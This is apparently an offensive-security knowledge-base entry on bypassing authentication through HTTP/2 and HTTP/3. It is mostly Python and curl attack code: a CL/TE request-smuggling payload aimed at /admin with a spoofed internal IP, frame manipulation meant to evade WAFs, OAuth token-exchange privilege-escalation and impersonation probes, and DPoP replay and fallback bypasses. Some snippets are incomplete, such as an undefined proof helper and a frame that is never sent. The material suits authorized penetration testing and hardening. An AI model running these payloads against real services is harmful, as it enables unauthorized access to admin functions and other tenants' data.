# KB-35: HTTP/2-3 Auth Smuggling & Protocol-Level Bypass

## Overview

HTTP/2 and HTTP/3 (QUIC) introduce new attack surfaces for auth bypass through request smuggling, header frame manipulation, and protocol downgrade attacks.

---

## 1. HTTP/2 Content-Length Desync

When front-end uses HTTP/2 and back-end uses HTTP/1.1, CL interpretation differs:

```python
class HTTPSmuggling:
    def __init__(self, target):
        self.target = target

    def test_h2_cl_desync(self):
        # HTTP/2 doesn't use CL for framing, but proxies may add it
        smuggled = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 0\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"X-Forwarded-For: 127.0.0.1\r\n\r\n"
        )
        print("[*] Smuggled request targets /admin with internal IP")
```

## 2. HTTP/2 CONTINUATION Frame Abuse

Headers split across HEADERS and CONTINUATION frames bypass WAFs:

```
CVE-2024-27316 (Apache): CONTINUATION frame DoS
CVE-2024-24549 (Tomcat): CONTINUATION header limit bypass

# WAFs inspect HEADERS frame only — auth headers in CONTINUATION bypass inspection
# Use Python h2 library for precise frame control:

import h2.connection, h2.config
import socket, ssl

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
sock = socket.create_connection(('target.com', 443))
sock = ctx.wrap_socket(sock, server_hostname='target.com')
conn = h2.connection.H2Connection()
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# HEADERS without END_HEADERS
headers = [(':method', 'GET'), (':path', '/admin'),
           (':scheme', 'https'), (':authority', 'target.com')]
conn.send_headers(1, headers, end_stream=False)
sock.sendall(conn.data_to_send())
# CONTINUATION with auth header — may bypass WAF
```

## 3. HTTP/3 QUIC Auth Issues

```bash
# Check H3 support
curl -sI --http3-only https://target.com --max-time 5

# Check Alt-Svc header
curl -sI https://target.com | grep -i alt-svc

# QUIC connection migration changes client IP mid-session
# 0-RTT requests may bypass auth checks
# Alt-Svc injection redirects to attacker H3 server
```

## 4. Token Exchange RFC 8693 Attacks

```python
class TokenExchangeAttacker:
    def __init__(self, token_endpoint):
        self.endpoint = token_endpoint

    def test_privilege_escalation(self, access_token, target_service):
        resp = requests.post(self.endpoint, data={
            'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
            'subject_token': access_token,
            'subject_token_type': 'urn:ietf:params:oauth:token-type:access_token',
            'audience': target_service,
            'scope': 'admin full-access',
        })
        if resp.status_code == 200:
            print("[CRITICAL] Privilege escalation via token exchange!")

    def test_cross_tenant(self, access_token, other_tenant):
        resp = requests.post(self.endpoint, data={
            'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
            'subject_token': access_token,
            'subject_token_type': 'urn:ietf:params:oauth:token-type:access_token',
            'audience': other_tenant,
        })
        if resp.status_code == 200:
            print("[CRITICAL] Cross-tenant token exchange!")

    def test_actor_impersonation(self, low_priv_token, admin_token):
        resp = requests.post(self.endpoint, data={
            'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
            'subject_token': admin_token,
            'actor_token': low_priv_token,
            'actor_token_type': 'urn:ietf:params:oauth:token-type:access_token',
        })
        if resp.status_code == 200:
            print("[CRITICAL] Impersonation via actor token!")
```

## 5. DPoP (RFC 9449) Bypass

```python
class DPoPBypass:
    def __init__(self, target, token_endpoint):
        self.target = target
        self.token_endpoint = token_endpoint

    def test_bearer_fallback(self, dpop_token):
        # Try Bearer instead of DPoP — many servers accept both
        resp = requests.get(f"{self.target}/api/protected",
                            headers={'Authorization': f'Bearer {dpop_token}'})
        if resp.status_code == 200:
            print("[CRITICAL] DPoP not enforced — Bearer accepted!")

    def test_proof_replay(self, token, proof):
        for i in range(3):
            resp = requests.get(f"{self.target}/api/protected",
                                headers={'Authorization': f'DPoP {token}', 'DPoP': proof})
            if resp.status_code == 200 and i > 0:
                print("[HIGH] DPoP proof replay accepted!")

    def test_key_mismatch(self, token):
        # Generate proof with DIFFERENT key than token's jkt claim
        from cryptography.hazmat.primitives.asymmetric import ec
        key = ec.generate_private_key(ec.SECP256R1())
        proof = self._create_proof(key, 'GET', f'{self.target}/api/protected')
        resp = requests.get(f"{self.target}/api/protected",
                            headers={'Authorization': f'DPoP {token}', 'DPoP': proof})
        if resp.status_code == 200:
            print("[CRITICAL] DPoP key binding not validated!")
```

## References

- CVE-2024-27316: Apache HTTP/2 CONTINUATION
- CVE-2024-24549: Tomcat HTTP/2 CONTINUATION
- RFC 8693: OAuth 2.0 Token Exchange
- RFC 9449: DPoP (Demonstrating Proof-of-Possession)
- HTTP/2 Request Smuggling research (James Kettle)
